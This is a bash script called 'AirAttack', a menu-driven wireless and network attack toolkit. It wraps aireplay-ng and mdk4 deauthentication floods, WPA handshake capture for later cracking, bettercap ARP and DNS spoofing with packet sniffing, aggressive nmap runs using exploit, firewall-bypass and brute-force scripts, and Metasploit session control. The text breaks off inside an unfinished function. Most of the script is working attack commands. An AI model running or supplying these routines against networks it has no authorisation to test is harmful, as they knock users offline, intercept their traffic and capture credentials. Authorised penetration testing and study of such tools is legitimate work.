#!/bin/bash



# ══════════════════════════════════════════════════════════════════════════════
#   CONFIG LOGIC
# ══════════════════════════════════════════════════════════════════════════════


#ROOT CHECK
if [[ $EUID -ne 0 ]]; then
    err "Run as root: sudo ./airattack.sh"
    exit 1
fi

#script starts
#→ bash checks who is running it
#→ if their EUID is not 0 (not root)
#→ print error and exit with code 1
#→ if EUID is 0 (root) → condition is false → skip block → continue

DEPS=(aircrack-ng airodump-ng aireplay-ng bettercap nmap john hashcat figlet xterm hcxpcapngtool crunch iw mdk4)

check_deps () {
    for dep in "${DEPS[@]}"; do
        if command -v "$dep" &>/dev/null; then
            info "$dep found"
        else
            err "$dep not found"
        fi
    done
    read -p "Press [Enter] to continue..."
}

#Loops through every tool in DEPS
#command -v checks if it exists in PATH
#Found → green [*] message
#Not found → red [!] message
#Shows all results then waits for enter


# ══════════════════════════════════════════════════════════════════════════════
# INTERFACE SELECTION LOGIC
# ══════════════════════════════════════════════════════════════════════════════
select_interface () {
    # Parse `iw dev` blocks: pair each "Interface X" with its following "type Y"
    mapfile -t WIFI_IFACES < <(
        iw dev | awk '
            /^\s*Interface/ { iface=$2 }
            /^\s*type/      { if (iface != "" && $2 == "managed") print iface; iface="" }
        '
    )

    if [[ ${#WIFI_IFACES[@]} -eq 0 ]]; then
        err "No managed-mode wireless interfaces found."
        err "If you had a monitor interface running from a previous session, clean it up first (option 2)."
        exit 1
    fi

    info "Available wireless interfaces:"
    local i=1
    for iface in "${WIFI_IFACES[@]}"; do
        printf "${ORANGE}%d) %s${NC}\n" "$i" "$iface"
        ((i++))
    done

    read -rp "$(printf "${MAGENTA}Select interface (1-${#WIFI_IFACES[@]}): ${NC}")" pick
    if [[ $pick =~ ^[0-9]+$ ]] && (( pick >= 1 && pick <= ${#WIFI_IFACES[@]} )); then
        INTER="${WIFI_IFACES[$((pick-1))]}"
    else
        err "Invalid selection — defaulting to ${WIFI_IFACES[0]}"
        INTER="${WIFI_IFACES[0]}"
    fi

    # Guard: never append "mon" onto something that's already a monitor-style name
    if [[ "$INTER" == *mon ]]; then
        err "Selected interface '$INTER' already looks like a monitor interface — aborting."
        exit 1
    fi

    INTERFACE="${INTER}mon"
    info "Managed: $INTER  |  Monitor: $INTERFACE"
    read -p "Press [Enter] to continue..."    
    #Here's a function that detects all wireless interfaces via iw dev, lets you pick one if there's more than one, and sets $INTER (and derives $INTERFACE as its monitor-mode name dynamically instead of hardcoding wlan0mon):
}

# ══════════════════════════════════════════════════════════════════════════════
# CONGIGURATION
# ══════════════════════════════════════════════════════════════════════════════
print_banner() {
    echo -e "${RED}"
    figlet -f slant "AirAttack"
    echo -e "${NC}"
    echo -e "${CYAN}        Wireless Audit Toolkit${NC}"
    echo
}

print_banners () {
    echo -e "${RED}"
    figlet -f slant "Offline Cracking"
    echo -e "${NC}"
    echo -e "${CYAN}        Wireless Audit Toolkit${NC}"
    echo
}

bettercap_banner () {
    echo -e "${RED}"
    figlet -f slant "SwissCap"
    echo -e "${NC}"
    echo -e "${CYAN}       Toolkit${NC}"
    echo
}

nmap_banner () {
    echo -e "${RED}"
    figlet -f slant "AirScan"
    echo -e "${NC}"
    echo -e "${CYAN}       Toolkit${NC}"
    echo
}

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
ORANGE='\033[38;5;208m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
DIMMER='\033[2;90m'
NC='\033[0m'


GOTO_MAIN=0 #GOTO_MAIN=0 — global flag, starts as 0 (false).
INTERFA="wlan1"
ap="" #to announce it globally 
ch=""
SUBNET=""
cp=""
pac=""
info() { printf "${GREEN}[*] $1${NC}\n"; } #$1 means here that every part inside ""
err()  { printf "${RED}[!] $1${NC}\n"; }
warn() { printf "${YELLOW}[!] $1${NC}\n"; }
prin() { printf "${BLUE} $1${NC}\n";}
pp () { printf "${BOLD}${RED} $1 ${NC}\n";}
pt () { printf "${DIMMER}${YELLOW}${DIM} $1 ${NC}\n";}
into () { printf "${BOLD}${MAGENTA} $1${NC}\n";}	
to () { printf "${BOLD}${GREEN} $1${NC}\n";}
out () { printf "${BOLD}${RED} $1${NC}\n";}

HASHFILE="/home/$(logname)/hash.txt"
HCFILE="/home/$(logname)/hashcat_hash.txt"
#hashcat and john hash locations
ACTIVE_PROC=0

ctrlc_kill () {
    if [[ $ACTIVE_PROC -eq 1 ]]; then
        warn "Ctrl+C detected — stopping process..."
        pkill -TERM -f "airodump-ng" 2>/dev/null
        pkill -TERM -f "aireplay-ng" 2>/dev/null
        pkill -TERM -f "mdk4" 2>/dev/null
        sleep 2
        pkill -9 -f "airodump-ng" 2>/dev/null
        pkill -9 -f "aireplay-ng" 2>/dev/null
        pkill -9 -f "mdk4" 2>/dev/null
        pkill -9 -f "xterm.*mdk4"
        ACTIVE_PROC=0
    fi
    while read -r -t 0.1 -n 1000 discard; do :; done
}
trap 'ctrlc_kill' SIGINT
#This means Ctrl+C anywhere it check active process in the script and kills it. The script keeps running.

prin_banner() {
    echo -e "${GREEN}"
    figlet -f slant "MAIN MENU"
    echo -e "${NC}"
    echo -e "${CYAN}        Toolkit${NC}"
    echo
}

workflow() {
    pp "$(printf "%-18s%-19s%-16s%-20s%-19s%-22s" "[WiFi]" "[Bettercap]" "[Nmap-NetIP]" "[Nmap-OtherIP]" "[Metasploit]" "[Hashcat]")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Monitor Mode" "├──Scan" "├──Scan Host" "├──Scan" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Managed Mode" "├──Select AP" "├──Open Port" "├──Runtime" "├──N/A" "├──N/A")"			#%-22s fixed width keeps columns locked regardless of terminal tab width
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Scan" "├──DNS+ARP Spoof" "├──Service" "├──Security" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Deauth" "├──Packet Sniffing" "├──Security" "├──Last Patched" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-26s%-25s%-22s" "├──Handshake" "├──MITM" "└──Version" "└──Active User" "├──N/A" "├──N/A")"
    pt "$(printf "%-24s%-25s%-22s%-14s%-25s%-22s" "└──PMKID" "└──Packets" "" "" "└──N/A" "└──N/A")"
    printf "\n"
}

# ══════════════════════════════════════════════════════════════════════════════
# FUCTIONS LOGIC
# ══════════════════════════════════════════════════════════════════════════════
run () {
	
		clear	
		prin_banner
		#prin "Script Loading....."
		#sleep 1
		check_deps
		clear
		#prin "Loading....."
		#sleep 1
		
		SUNET=$(ip route | grep -v default | grep "$INTER" | awk '{print $1}')
		#This grabs the local subnet automatically from the interface — no manual input needed. 

}

# ══════════════════════════════════════════════════════════════════════════════
# WIFI LOGIC
# ══════════════════════════════════════════════════════════════════════════════

cleanup () {

    warn "Deleting monitor interface $INTERFACE..."
    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
	}
}

wlan_checker () {
        if ! ip link show "$INTER" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTER not found — Enable it First"
        return 1
		fi
}

create () {

 # ══════════════════════════════════════════════════════
 #Creating Virtual Monitor INTERFACE
 # ══════════════════════════════════════════════════════

    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
    }

    info "Creating monitor interface $INTERFACE on $INTER...\n"
    if 
        sudo iw dev "$INTER" interface add "$INTERFACE" type monitor; then
        sudo ip link set "$INTERFACE" up
        echo -e "${GREEN}$INTERFACE ready ${NC}"
    else
        err "Could not create $INTERFACE — is $INTER available?"
        printf "${RED}Check: iw dev ${NC}"
        exit 1
    fi

    read -p "Press [Enter] key to continue..."
}

delete () {

    # ══════════════════════════════════════════════════════
    #Deleting Virtual Monitor if avilable
    # ══════════════════════════════════════════════════════
    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
    }
    info "Interface Restored"
    read -p "Press [Enter] key to continue..."
}

show_target() {
    echo -e "${BLUE}╔═══════════════════════════════╗${NC}"
    if [[ -z $ap ]]; then
        echo -e "${BLUE}║    ${BOLD}AP: ${RED}Not Selected${NC}${BLUE}\t\t║${NC}"
        echo -e "${BLUE}║    ${BOLD}CH: ${RED}Not Selected${NC}${BLUE}\t\t║${NC}"
    else
        echo -e "${BLUE}║    ${BOLD}AP: ${GREEN}$ap${NC}${BLUE}\t║${NC}"
        echo -e "${BLUE}║    ${BOLD}CH: ${GREEN}$ch${NC}${BLUE}\t\t\t║${NC}"
    fi
    echo -e "${BLUE}╚═══════════════════════════════╝${NC}"
}

wifi_scan () {

  mon_checker || return 1

 #    ip link show "$INTERFA" >/dev/null 2>&1 && { #Deletes wlan1 if avilable for only pmkid
 #    sudo ip link set "$INTERFA" down 2>/dev/null
 #    sudo iw dev "$INTERFA" del 2>/dev/null
 #    }

	warn "Press Ctrl+C here to stop scan"
 # ══════════════════════════════════════════════════════
 #Scanning Process
 # ══════════════════════════════════════════════════════
  rm -f scan-* 2>/dev/null 
  
	read -rp "$(printf "${PURPLE} Scanning Time... ${NC}\n")" sec
	
    if [[ -z $sec || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
		err "Scan time must be a number greater than 0"
		return 1
    fi
    
    xterm -bg black -fg cyan -title "WiFi Scan" -e "airodump-ng $INTERFACE --write scan --output-format csv & PID=\$!; sleep $sec; kill -TERM \$PID; sleep 2; kill -9 \$PID 2>/dev/null" &
    
    SCAN_PID=$!
    wait $SCAN_PID #this make the script for 15 sec
    printf "${GREEN}Scan Finished${NC}\n"

 # ══════════════════════════════════════════════════════
 #Selection Part
 # ══════════════════════════════════════════════════════
    awk -F',' 'NR>2 && $1 ~ /^[0-9A-Fa-f]{2}:/ && $4 !~ /-/ {
    count++
    printf "\033[1;31m%d. %s, %s\033[0m\n", count, $1, $4
    }' scan-01.csv | sed 's/\x1b\[[0-9;]*m//g' > /tmp/scan_results.txt 
	

	


 #-F',' is setting seperator as comma and become colomn,,NR-numberline and >2 means leave these 2 lines,,$4 !~ /-/ — skip any line where column 4 contains a -,,,count ++ create numbers and extra + is to add one 
 #sed 's/\x1b\[[0-9;]*m//g' — strips all color escape codes before saving to the file, so $ap and $ch are clean when extracted.;;;%d — prints the number,,%s — prints the field value,,\033[1;31m — RED color (same as your $RED variable, but awk can't use bash variables directly),,, >  /tmp/scan_results.txt saves the output data and from where the read selectionis done
   #	cat /tmp/scan_results.txt
   scan_check

    read -rp "$(printf "${PURPLE}${BOLD}Select target (1-$(wc -l < /tmp/scan_results.txt)): ${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available

    ap=$(awk -F'[,.]' -v pick="$PICK" 'NR==pick {gsub(/ /, "", $2); print $2}' /tmp/scan_results.txt)
    ch=$(awk -F',' -v pick="$PICK" 'NR==pick {gsub(/ /, "", $2); print $2}' /tmp/scan_results.txt)

 # ══════════════════════════════════════════════════════
 #checking Part
 # ══════════════════════════════════════════════════════

    if [[ -n $ap ]]; then
        printf "${GREEN} AP Selection Successful ${NC}\n"
    else
        printf "${RED} AP Selection Failed ${NC}\n"
        return 1
    fi

        if [[ -n $ch ]]; then
        printf "${GREEN} Channel Selection Successful ${NC}\n"
    else
        printf "${RED} Channel Selection Failed ${NC}\n"
        return 1
    fi
    rm /tmp/scan_results.txt 2>/dev/null 
    read -p "Press [Enter] key to continue..."
}

scan_check () {
	
	if [[ -f /tmp/scan_results.txt ]]; then
		 cat /tmp/scan_results.txt
	else 
		err "Scan file not created try again"
		return 1
	fi
}

wifi_deauth () {
    printf "${PURPLE}${BOLD} Starting... ${NC}\n"
 if [[ -z $ap ]]; then
         err "Run Target Scan First"
 else
    mon_checker || return 1 #|| means "if the left side fails, do the right side" — so if mon_checker returns 1 (failure), it immediately does return 1 and exits the function.
    sudo iw dev "$INTERFACE" set channel "$ch"
    # xterm=open new terminal,,,-e = to run command in terminal,,,& — run in background so your main script continues;;;; bash — after the command finishes (or errors), drops into a bash shell keeping the window open so you can see the output/error.
    #read -rp expects a string as the prompt, not a command. So you use $() to convert the printf output into a string first.
    
    #-z = zero length (empty)
    #-n = non zero length (has data)
    #rempve bash and exit if any error occur in xterm terminal
    
    while true; do
		info "-----Make Choice-----"
		into "1) Aireplay Attack"
		into "2) MDK4 Attack (No Client Mac Needed)"
		warn "Press Ctrl+C here to stop"
		into "0) Back"
		
    
		read -p ">>	" choice
		
		case $choice in 
		
			1) read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client\n\t\tFor all leave empty): ${NC}\t")" cp
				read -rp "$(printf "${MAGENTA}Deauth Packets Numbers(0 for infinite): ${NC}\t")" pac
				if [[ -z $pac ]]; then
					printf "${RED}Number of packets is not selected ${NC}\n"
					continue
				fi
				
				if [[ -z $cp ]]; then
					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
				else
					xterm -bg black -fg red -title "Deauth Attack" -e "aireplay-ng --deauth $pac -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
				fi
				;;
			
			2)	read -rp "$(printf "${MAGENTA}Deauth duration in seconds: ${NC}\t")" dur
				xterm -bg black -fg red -title "Deauth Attack" -e "timeout $dur mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &
				;;	
			
			0) break ;;
				
			*) err "Wrong Choice "
				read -p "Press [Enter] key to continue..." 
				continue ;;	
		esac
    done
    
 fi
    read -p "Press [Enter] key to continue..."
}

mon_checker () {
        if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTERFACE not found — Create Monitor Mode first"
        return 1
		fi
}

wifi_handshake () {
    printf "${PURPLE} Capturing... ${NC}\n"
 if [[ -z $ap ]]; then
        err "Run Target Scan First"
 else

 handshake_check    

    #-w handshake — save capture to handshake-01.cap,,,--output-format pcap — save as pcap format (needed for cracking later)
    mon_checker || return 1
    read -rp "$(printf "${MAGENTA}Deauth client  (Enter MAC of client or For all leave empty): ${NC}\t")" cp
    sudo iw dev "$INTERFACE" set channel "$ch"
    
    

    read -p "Press [Enter] key to continue..."  
    
    pp "1) Aireplay"
    pp "2) MDK4 (Best)"
    warn "Please Dont Press Ctrl+C here"
    read -rp "$(info "Attack Mode ")" mode

if [[ $mode = 1 ]]; then
    if [[ -z $cp ]]; then
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap $INTERFACE --ignore-negative-one; bash, exit" &
        
    else
        xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
        xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 aireplay-ng --deauth 0 -a $ap -c $cp $INTERFACE --ignore-negative-one; bash, exit" &
     fi
     
elif [[ $mode = 2 ]]; then
		xterm -bg black -fg green -title "Handshake Capture" -e "airodump-ng --bssid $ap -c $ch -w handshake --output-format pcap $INTERFACE  & PID=\$!; sleep 40; kill -9 \$PID; bash, exit" &
		xterm -bg black -fg red -title "Deauth Attack" -e "timeout 25 mdk4 $INTERFACE d -B $ap -c $ch; bash, exit" &

else 
	err "Wrong Choice"
	return 1
	
fi
    sleep 2
    read -rp "$(printf "${MAGENTA}Press Enter to verify handshake...${NC}")"
    
    if 
        aircrack-ng handshake* 2>&1 | grep -q "1 handshake"; then
        printf "${GREEN}Handshake captured successfully!${NC}\n"
    else
        printf "${RED}No handshake* found — try again${NC}\n"
        printf "${RED}No Handshake Found Removing File 'handshake-01.cap' ${NC}\n"
        rm handshake*
	fi
   fi  
    read -p "Press [Enter] key to continue..."
 #grep -q "1 handshake" — silently checks if the output contains that string, returns true/false.

}

wifi_pmkid () {
    info " PMKID tool not available...\n"
 #    printf "${PURPLE} PMKID Capturing... ${NC}\n"

 # ══════════════════════════════════════════════════════
 #Deleting and creating new wlan1
 # ══════════════════════════════════════════════════════
 #   printf "${RED}Deleting monitor interface $INTERFACE... ${NC}"
 #    ip link show "$INTERFACE" >/dev/null 2>&1 && {
 #   sudo ip link set "$INTERFACE" down 2>/dev/null
  #  sudo iw dev "$INTERFACE" del 2>/dev/null
   # }

    #printf "${MAGENTA}Creating interface $INTERFA.....${NC}\n"
    #if 
    #    sudo iw dev "$INTER" interface add "$INTERFA" type managed; then
    #    sudo ip link set "$INTERFA" up
    #    sudo nmcli dev set $INTERFA managed no  # ← tell NM(Network Manager) to leave wlan1 alone
    #    echo -e "${GREEN}$INTERFA ready ${NC}"
    #else
    #    printf "${RED}Could not create $INTERFA — is $INTER available? ${NC}"
    #    printf "${RED}Check: iw dev ${NC}"
    #   return 1
    #fi

 #--filterlist_ap=$ap — target only your AP;;;--filtermode=2 — whitelist mode (only capture specified AP);;;-w pmkid.pcapng — save output file
    #xterm -bg black -fg cyan -title "PMKID Capture" -e "hcxdumptool -i ${INTERFA} -c ${ch}a -w pmkid.pcapng --exitoneapol=1; bash" &
 read -p "Press [Enter] key to continue..."
}

handshake_check () {
	    
	if ls handshake* 2>/dev/null | grep -q .; then  #ls handshake* 2>/dev/null — lists matching files, suppresses error if none found. grep -q . — returns true if any output exists (at least one file matched).
    rm -f handshake-* 2>/dev/null					#better for this tyoe if [[ -f handshake* ]]; then
    warn "Handshake file removed"
    else 
		warn "No Previous Handshake file"
    fi
	read -p ">>"
}
# ══════════════════════════════════════════════════════════════════════════════
#      WIFI MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

wifi_menu() {
    while true; do
        clear
        print_banner
        show_target

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${GREEN}${BOLD}              RECONNAISSANCE             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${ORANGE}1. Switch to Monitor Mode${NC}\n"
        printf "${ORANGE}2. Switch to Managed Mode${NC}\n"
        printf "${ORANGE}3.🔍 Target Scan(Monitor Mode Required) ${NC}\n"
        info "For The IP Of The Target Use Scan Bettercap"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${RED}${BOLD}               ATTACK             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${GREEN}4.☠️ Deauth Attack ${NC}\n"
        printf "${GREEN}5.🫱🏻‍🫲🏿 HandShake Capture (Wait 1 min) ${NC}\n"
        printf "${GREEN}6.🫣 PMKID Capture ${NC}\n"

        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"
        printf "${YELLOW}${BOLD}               Main Menu             ${NC}\n"
        printf "${DIM}══════════════════════════════════════════════════════${NC}\n"

        printf "${RED}0.🔙 Main Menu ${NC}\n"

    read -rp " $(printf "${BOLD}Choose Option(0-6) ==> ${NC}")" wifi

    case $wifi in 
        1) wlan_checker
			create;;
        2) delete;;
        3) wifi_scan;;
        4) wifi_deauth;;
        5) wifi_handshake;;
        6) wifi_pmkid;;
        0) if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
			info "Exiting AirAttack"
			#sleep 2
			break
		   else
				read -rp "$(printf "${MAGENTA} Want Persistant Monitor Mode (y/n)::\t ${NC}")" yes
				if [[ $yes = y ]]; then
					break
				else
					cleanup 
				break
					fi	
			fi ;;

			
		*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"

    esac
done
}


# ══════════════════════════════════════════════════════════════════════════════
# 		BETTERCAP LOGIC
# ══════════════════════════════════════════════════════════════════════════════

sunet () {
    local label
    if [[ -z $SNET ]]; then
        label="Not Selected"
    else
        label="$SNET"
    fi

    # Fixed inner width = 29 chars (between ║ and ║)
    local inner="Target: $label"
    local padded
    padded=$(printf "%-29s" "$inner")   # left-align, pad to 29

    echo -e "${MAGENTA} ╔═══════════════════════════════╗${NC}"
    into "║${BOLD}${RED}${padded}${NC}${MAGENTA}  ║${NC}"
    echo -e "${MAGENTA} ╚═══════════════════════════════╝${NC}"
}

scan () {
	read -rp "$(printf "${GREEN} Scan time(sec)....")" sec
	sudo bettercap -iface "$INTER" -eval "net.recon on; net.probe on; wifi.recon on; sleep $sec; net.show; wifi.show; exit" 2>/dev/null
}

better_menu () {
    local gw
    gw=$(ip route | awk '/^default/ {print $3; exit}')
    [[ -z $gw ]] && gw="unavailable"
    read -rp "$(info "Enter Network IP or press [ENTER] for gateway ($gw): ")" input
    if [[ -z $input ]]; then
        SNET="$gw"
    else
        SNET="$input"
    fi
    info "Target set to: $SNET"
    read -rp "$(printf "${MAGENTA}Press Enter to continue...${NC}")"
}
#ip route | awk '/^default/ {print $3; exit}' pulls the gateway IP from the default route line (3rd field is the via address). exit after first match avoids issues if there are multiple default routes (e.g. wlan0 + eth0).

spoof () {
	
	read -rp "$(info "Domain to spoof or ${RED}[All]: ")" DOMA
    if [[ -n $DOMA ]]; then
        DOMAIN="$DOMA"
    else
        DOMAIN="*"
    fi
    info "Domain set to: $DOMAIN"
    
    read -rp "$(info "Location where to spoof or ${RED}Default[Google]: ")" FAKE_IP
    if [[ -n $FAKE_IP ]]; then
        FAKE="$FAKE_IP"
    else
        FAKE="8.8.8.8"
    fi
    info "Spoofing set to: $FAKE"
    
    read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Spoofing time(sec)....")" sec
    
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set dns.spoof.domains $DOMAIN;
        set dns.spoof.address $FAKE;
        dns.spoof on;
        sleep $sec;
        exit; "
}

mitm () {
     read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
		TARGET="$TARGET_IP"
	else
		TARGET="$SUNET"
    fi
    
    read -rp "$(printf "${GREEN} Sniff time(sec)....")" sec
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set net.sniff.verbose true;
        set net.sniff.output /tmp/sniff_$(date +%F_%T).pcap;
        net.sniff on;
        sleep $sec;
        exit
    "
}


# ══════════════════════════════════════════════════════════════════════════════
# 		BETTERCAP MENU LOGIC
# ══════════════════════════════════════════════════════════════════════════════

bettercap_menu () {
	
		clear
		while true; do 
		
		bettercap_banner 
		sunet
		
		info "-----Choose Menu-----"
			into "1) Scan Network"
			into "2) Select Network"
			into "3) DNS+ARP Spoof"
			into "4) MITM"
			out "0) Main Menu"
			
		read -p ">>" choice
		
			case $choice in 
				
				1)scan;;
				
				2)better_menu;;
				
				3)spoof;;
				
				4)mitm;;
				
				0) break;;
				
				*) err "Wrong Choice [ENTER]"
					read -p ">>"
					continue ;;			
			esac
		done
}

# ══════════════════════════════════════════════════════════════════════════════
# NMAP LOGIC
# ══════════════════════════════════════════════════════════════════════════════

ip_check () {
 if [[ ! $SUBNET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(\/[0-9]+)?$ ]]; then  # checks if $SUBNET looks like 192.168.1.0 or 192.168.1.0/24. If not, error and return
    err "Invalid IP/CIDR format: $SUBNET"
    read -p "Press [Enter] to continue..."
    return 1
 fi
}

network () {
	
	while true; do 
	ip_check
	info "$SUBNET"
	info "---Make a choice---"
		into "1) Hosts Scan"
		into "2) Ports"
		into "3) Service"
		into "4) Security & Firewall"
		into "5) OS Version"
		out "0) Back"
		out "00) Main Menu"
		
	read -p ">>" choice
	
	case $choice in 
		
		1) sudo nmap -sn --send-eth --resolve-all -T4 $SUBNET;;

		2) read -rp "$(printf "${ORANGE}Scan all ports? (y/n): ${NC}")" allports
			if [[ $allports = y ]]; then
				sudo nmap -p- --open -T4 -n --min-rate 5000 $SUBNET
			else
			read -rp "$(printf "${ORANGE}Enter port/range (e.g. 80 or 1-1000): ${NC}")" PORT
			sudo nmap -p "$PORT" -sV -sC -O -A --open -T4 \
			--script=banner,vulners,exploit \
			$SUBNET			
			fi;;		
			
		3) sudo nmap -sV --version-intensity 7 -p- -T4 --min-rate 3000 --script=banner,http-headers,http-title,ssh-hostkey,ftp-anon,smtp-commands,http-enum,ssl-cert,dns-service-discovery,http-server-header $SUBNET;;

		4) sudo nmap -sS -Pn --open -T4 --min-rate 3000 --script=ipidseq,snmp-info,auth,dns-recursion,dns-cache-snoop,broadcast-dns-service-discovery $SUBNET;;

		5) sudo nmap -O --osscan-guess --fuzzy -T4 --script=nbstat,smb-os-discovery,broadcast-dhcp-discover $SUBNET;;
    
		0) break;;
		
		00) GOTO_MAIN=1; break;;
		#00 — set flag to 1 (true), then break out of network loop. Control returns to wherever network was called from (nmap_menu).
		
		*);;
		
	esac
	done
}

other () {
	
	while true; do 
	ip_check
	info "$SUBNET"
		into "1) IP Scan"
		into "2) Server Runtime"
		into "3) Server Security,Firewall"
		into "4) Last Patched"
		into "5) Active Users"
		out "0) Back"
		out "00) Main Menu"
	
	read -p ">>" choice
	
	case $choice in 
		
		1) sudo nmap -Pn -sn --reason $SUBNET \
			--script=asn-query,whois-ip,ip-geolocation-ipinfodb;;
		
		2) sudo nmap -sV -sS -Pn $SUBNET \
			--script=uptime-agent,snmp-sysdescr,clock;;
		
		3) sudo nmap -sS -sA -Pn -T4 $SUBNET \
			--script=firewalk,firewall-bypass,vulners,exploit,auth,\
			http-shellshock,http-put,http-git,ftp-anon,\
			smb-vuln-ms17-010,ssl-heartbleed;;
		
		4) sudo nmap -sV -sU -O -Pn -p 161,445,22 $SUBNET \
			--script=snmp-sysdescr,snmp-win32-updates,\
			smb-os-discovery,banner;;
		
		5) sudo nmap -sV -Pn -p 22,445,161,79 $SUBNET \
			--script=finger,smb-enum-users,smb-enum-sessions,\
			snmp-win32-users,users-brute;;
		
		0) break;;
		
		00) GOTO_MAIN=1; break;;
		
		*);;
		
	esac
	done
}

# ══════════════════════════════════════════════════════════════════════════════
# NMAP MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

nmap_menu () {		
	while true; do
		clear
		nmap_banner
		
		into "1) Network IP"
		into "2) Other IP"
		out "0) Main Menu"
	
	read -rp "$(printf "${BOLD}${DIM}${GREEN}Choose any option ==>${NC}\t")" choice
	
	case $choice in 
	
			1) read -rp "$(info "Enter the Network IP or Leave Blank")" SUBNET
               [[ -z $SUBNET ]] && SUBNET=$(ip route | grep -v default | grep "$INTER" | awk '{print $1}') #Logic is that if -z is false (string is not empty) so it skips the auto-fill line and uses whatever the user typed directly — $SUBNET stays as their input and network runs with it.
               network
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            
            2) if ! ping -c 1 -W 2 8.8.8.8 &>/dev/null; then
				err "No internet connection — geolocation scripts need internet"
				read -p "Press [Enter] to continue..."
				return 0
				fi

			read -rp "$(info "Enter Target IP or Leave Blank for Gateway")" SUBNET
			[[ -z $SUBNET ]] && SUBNET=$(ip route | awk '/^default/ {print $3; exit}')
			other
			[[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;; #After nmap_main (which called network) returns — check the flag. If it's 1, reset it to 0 and break out of nmap_menu loop. Control returns to main menu.
            
		
		0) info "Bye Bye"
			break ;;
			
		*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
			continue ;;
	
	
	esac	
	done
}


# ══════════════════════════════════════════════════════════════════════════════
# 		META Logic
# ══════════════════════════════════════════════════════════════════════════════


start () {
    local MSF_SESSION="msf"

    info "Starting Metasploit Database..."

    if ! systemctl is-active --quiet postgresql; then
        warn "PostgreSQL not running — starting..."
        sudo systemctl start postgresql
        sleep 1
    fi

    if systemctl is-active --quiet postgresql; then
        info "PostgreSQL running"
    else
        err "Failed to start PostgreSQL"
        read -p "Press [Enter] to continue..."
        return 1
    fi

    info "Initializing msfdb..."
    sudo msfdb init 2>/dev/null

    if tmux has-session -t "$MSF_SESSION" 2>/dev/null; then
        info "Metasploit already running — connecting to existing session..."
        sudo tmux attach-session -t "$MSF_SESSION"
    else
        info "Launching msfconsole..."
        sudo tmux new-session -s "$MSF_SESSION" "msfconsole -q"
    fi

    read -p "Press [Enter] to continue..."
}

scanning () {
    read -rp "$(info "Enter target IP/Subnet: ")" TARGET
    info "Running db_nmap on $TARGET..."
    sudo msfconsole -q -x "db_nmap -sV -T4 --open $TARGET; exit"
    read -p "Press [Enter] to continue..."
}

list_sessions () {
    sudo msfconsole -q -x "sessions -l; exit"
    read -p "Press [Enter] to continue..."
}

interact_session () {
    read -rp "$(info "Session ID: ")" SID
    sudo msfconsole -q -x "sessions -i $SID"
    read -p "Press [Enter] to continue..."
}

kill_session () {
    read -rp "$(info "Session ID to kill: ")" SID
    sudo msfconsole -q -x "sessions -k $SID; exit"
    read -p "Press [Enter] to continue..."
}

exploit () {
    read -rp "$(info "Enter service/CVE to search: ")" QUERY
    sudo msfconsole -q -x "search $QUERY; exit"
    read -p "Press [Enter] to continue..."
}

sessions () {
